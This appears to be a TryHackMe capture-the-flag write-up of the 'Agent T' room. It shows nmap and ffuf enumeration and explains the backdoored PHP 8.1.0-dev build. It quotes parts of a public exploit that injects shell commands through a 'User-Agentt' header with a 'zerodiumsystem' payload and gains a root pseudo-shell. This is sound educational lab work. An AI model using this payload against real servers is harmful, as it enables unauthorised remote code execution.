# Agent T — TryHackMe Writeup

**Difficulty:** Easy  
**Category:** Web / Supply-Chain Vulnerability  

Note: The exploit used in this walkthrough was not written by me so full credits goes to **flast101**, the original author of the exploit. The exploit is in this repository however you can find the exploit on his [Github](https://github.com/flast101/php-8.1.0-dev-backdoor-rce) and a breakdown of this exploit can be found on his [blog](https://flast101.github.io/php-8.1.0-dev-backdoor-rce/).

## Introduction
Agent T is an easy rated TryHackMe room built around a single, well-known supply-chain vulnerability: a backdoored PHP 8.1.0-dev build that briefly made it onto the official PHP git mirror in March 2021 before being caught and reverted. Rather than relying on misconfigurations or chained privilege-escalation steps like most easy boxes, this room tests whether you can fingerprint an unusual PHP version during enumeration, recognize it as the known backdoor, and exploit the hidden `User-Agentt` header check to achieve remote code execution.

## Enumeration
The first step was to perform a port and service enumeration scan using `nmap` to identify our attack surface on this machine:
```
nmap -sVC -p- -T4 10.65.185.134 -oN nmap_scan.txt
```
<img width="1920" height="410" alt="image" src="https://github.com/user-attachments/assets/42bc250a-afea-45b0-9579-ae400343ea3d" />

- The scan results showed that port 80 was open, hosting an Admin Dashboard webpage. This also revealed that the application was running PHP version **8.1.0-dev**.

At this stage, I didn't understand the significance of the PHP version so I explored the website and followed it up by directory enumeration using 
`ffuf` to uncover any hidden paths or resources:
<img width="1920" height="1048" alt="image" src="https://github.com/user-attachments/assets/46f5e475-00d8-420d-8984-9802e6003fb6" />


```
ffuf -u http://10.65.185.134/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt,.py,.css,.js -mc 200,301,302
```
<img width="1920" height="862" alt="image" src="https://github.com/user-attachments/assets/22eef01d-d432-4408-b5c3-8d72f667e32e" />

- Unfortunately, the above scan was useless since it tagged every item in the wordlist and returned it as a valid page

To get around this, I filtered out the pages that had a size of 42131 bytes but again it yielded useless results:
<img width="1920" height="889" alt="image" src="https://github.com/user-attachments/assets/03350cbc-8cbd-42b5-9a87-f2ba5e08ed4e" />

After I looked into HTTP response headers using **Burpsuite** hoping to find a clue about how to gain access to the machine:
<img width="1603" height="894" alt="image" src="https://github.com/user-attachments/assets/b1a84f06-ac2f-4d4d-9dfe-95012d246685" />
- The `X-Powered-By` header caught my attention and this header is a non standard HTTP response header which is used to identify what technology, software, or framework was used to load a webpage. This is a way for an attacker to exploit the server if there is a known vulnerability by the software being used.


With this information I looked up exploits for PHP version 8.1.0-dev using `searchsploit`:
<img width="1920" height="955" alt="image" src="https://github.com/user-attachments/assets/83b41490-8797-4b5d-ac8b-26e794f1a6ee" />
- The clue I was looking for was hiding in plain sight

## Exploitation
### Background 
In March 2021, attackers had compromised the official PHP source repository (git.php.net) and pushed two malicious commits disguised as normal changes. The commits added a backdoor to `/ext/standard/http_fetch_header.c` which is part of how PHP processes HTTP headers. The backdoor was short lived and as a result PHP moved its repository to GitHub. 

### How the backdoor works
The malicious code checks every incoming HTTP request for a `User-Agentt` header (**note: two t's** -- this is a deliberate typo so it wouldn't collide with the legitimate `User-Agent` header and would be easy to miss on a casual code inspection).

If that header is present, the backdoor takes it value and passes it straight into a PHP function that would execute the code. Since this logic runs at the HTTP request handling level before your application code even runs, it doesn't matter what the website itself does, any page that is running this version of PHP is vulnerable to this attack. 

### Payload
After looking through the `searchsploit` results, I found a matching exploit: _PHP 8.1.0-dev - 'User Agentt' Remote Code Execution_, written by **flast101**:
<img width="1920" height="1000" alt="image" src="https://github.com/user-attachments/assets/bc94038e-d5b9-48e4-ab00-607e969efbf8" />

### Breaking it down
```python
response = request.get(host)
if str(response) == '<Response [200]>':
```
- This confirms if the host is reachable and returns an HTTP 200 response code before doing anything.

```python
while 1:
  cmd = input("$ ")
```
- The exploit itself provides a **pseudo-shell** not an interactive shell however this code loops while printing out `$` and waits for you to respond which gives the illusion of an interactive shell session being created.

```python
headers = {
    "User-Agent": "...",
    "User-Agentt": "zerodiumsystem('" + cmd + "');"
}
response = request.get(host, headers=headers, allow_redirects=False)
```
- Whatever is typed at the `$` prompt gets string concatenated directly into the `zeroiumsystem('...')` payload and sent as the `User-Agentt` header on a normal GET request. The backdoor in the PHP build reads that header on the server side and executes the string inside the parentheses as a shell command via PHP's `system()` internally.

```python
current_page = response.text
stdout = current_page.split('<!DOCTYPE html>', 1)
text = print(stdout[0])
```
- The command's output gets printed directly into the HTML response before the normal HTML even starts, so the script splits the response on `<!DOCTYPE html>` and only prints whatever came before that which is your command's `stdout`, with the rest of the normal webpage HTML being discarded.

To sum it up:
1. You would type a command which then gets embedded in the `User-Agentt` header which is sent to the server as a normal HTTP GET request
2. The backdoored PHP build parses the data and passes its contents into the PHP `system()` function internally on the server
3. `system()` hands it off to the OS shell present on the server and executes the commands
4. Instead of the command's output being written to `stdout`, it's written into the HTTP response body (ahead of the webpage's HTML) and the script extracts it back out for you to read



## Flag Capture
Upon running the script I verified my permissions and confirmed that I was logged in as the `root` user:
<img width="1920" height="610" alt="image" src="https://github.com/user-attachments/assets/0eccc4a9-85ff-4ba6-a5f1-d72d3c578420" />

Since this was a pseudo-shell I ran the `find` command to locate the flag and I solved the challenge:
<img width="1920" height="650" alt="image" src="https://github.com/user-attachments/assets/ac3f56eb-ede6-4ffa-9c89-4edbd4aeb4b9" />


## Lessons Learned
- **Version fingerprinting matters.** Identifying the exact PHP version during enumeration was what led directly to the exploit which is a reminder to always check HTTP headers along with `nmap` results for software versions during recon.
- **Supply-chain attacks target trust, not just the code**. This wasn't an application bug. This was a compromise of PHP's own official source repository, showing that the tools underneath your code can also be an attack surface.
- **Avoid running dev builds** in production because this vulnerability only existed because of a short-lived `-dev` release.
